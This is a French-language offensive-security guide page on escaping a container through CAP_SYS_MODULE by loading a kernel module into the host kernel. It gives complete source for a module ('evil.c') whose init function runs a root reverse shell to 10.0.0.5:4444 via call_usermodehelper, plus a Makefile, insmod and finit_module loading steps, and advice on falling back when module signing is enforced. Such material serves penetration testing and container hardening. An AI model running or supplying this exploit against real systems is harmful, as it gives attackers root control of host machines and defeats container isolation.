---
title: "CAP_SYS_MODULE : charger un module noyau qui s'exécute sur l'hôte"
order: 3
description: "CAP_SYS_MODULE permet à un conteneur d'appeler init_module et finit_module pour insérer du code arbitraire dans le noyau de l'hôte. Un court module noyau dont la fonction init appelle call_usermodehelper exécute un programme choisi en tant que root dans l'espace de noms init de l'hôte, offrant une évasion de conteneur fiable qui ne dépend ni des cgroups ni de l'accès aux périphériques."
keywords:
  - cap_sys_module
  - init_module
  - module noyau
  - call_usermodehelper
  - évasion de conteneur
---

# CAP_SYS_MODULE

`CAP_SYS_MODULE` autorise les appels système `init_module(2)` et `finit_module(2)`, qui chargent du code directement dans le noyau hôte en cours d'exécution. Comme les modules noyau partagent l'unique noyau de l'hôte quels que soient les espaces de noms, un module chargé depuis l'intérieur d'un conteneur s'exécute en ring 0 sur l'hôte. L'évasion standard est un module minuscule dont la routine d'init utilise `call_usermodehelper` pour lancer un programme en espace utilisateur dans l'espace de noms init de l'hôte, typiquement un reverse shell ou une commande qui dépose une clé SSH.

Confirmez la capacité et que l'outillage de modules est présent :

```bash
capsh --print | grep -o cap_sys_module
grep CapEff /proc/self/status          # bit 16 set
ls /usr/src/linux-headers-$(uname -r) 2>/dev/null || echo "need headers matching $(uname -r)"
```

## Compiler et charger le module

Le module doit être compilé avec des en-têtes correspondant à la version du noyau de l'hôte, car `vermagic` est vérifié au moment du chargement. Les conteneurs embarquent rarement les en-têtes, alors compilez en croisé sur un noyau correspondant ou installez-les dans un builder jetable.

```c
// evil.c
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kmod.h>

static char *cmd = "/bin/sh";
module_param(cmd, charp, 0);

static int __init evil_init(void) {
    char *argv[] = { "/bin/sh", "-c",
        "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", NULL };
    char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    // UMH_WAIT_PROC: run to completion in the host init namespace as root
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}
static void __exit evil_exit(void) { }
module_init(evil_init);
module_exit(evil_exit);
MODULE_LICENSE("GPL");
```

```makefile
# Makefile
obj-m += evil.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

```bash
make                                   # produces evil.ko
insmod ./evil.ko                       # or: finit_module via a tiny loader
# the reverse shell fires immediately in evil_init, as root on the host
```

Si `insmod` n'est pas dans l'image, appelez l'appel système directement : ouvrez le `.ko` et invoquez `finit_module(fd, "", 0)` depuis quelques lignes de C, ce qui évite d'avoir besoin des outils kmod en espace utilisateur.

## Notes d'exploitation

- `MODULE_LICENSE("GPL")` évite un refus pour cause de « taint » sur certaines configurations ; le module se charge quand même sans, mais peut consigner un avertissement de taint.
- La commande du reverse shell s'exécute via `call_usermodehelper` dans l'ensemble d'espaces de noms init (PID 1) de l'hôte, elle n'est donc pas confinée par les espaces de noms ou les cgroups du conteneur même si `insmod` a été lancé à l'intérieur du conteneur.
- Secure Boot avec signature de modules imposée (`CONFIG_MODULE_SIG_FORCE`) rejette un module non signé ; vérifiez `cat /sys/module/module/parameters/sig_enforce` et `dmesg | grep -i 'module verification'`. Lorsque c'est imposé, repliez-vous sur [CAP_SYS_ADMIN](cap-sys-admin.md) ou [Périphérique bloc de l'hôte](../device-access/host-block-device.md).
- Cette capacité est incluse dans `--privileged` ; c'est la voie 3 de [Flag privileged](../privileged-flag.md).

## Références

- [man 2 init_module](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [xcellerator : Linux kernel rootkit / call_usermodehelper](https://xcellerator.github.io/posts/linux_rootkits_11/)
- [HackTricks : CAP_SYS_MODULE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_module)
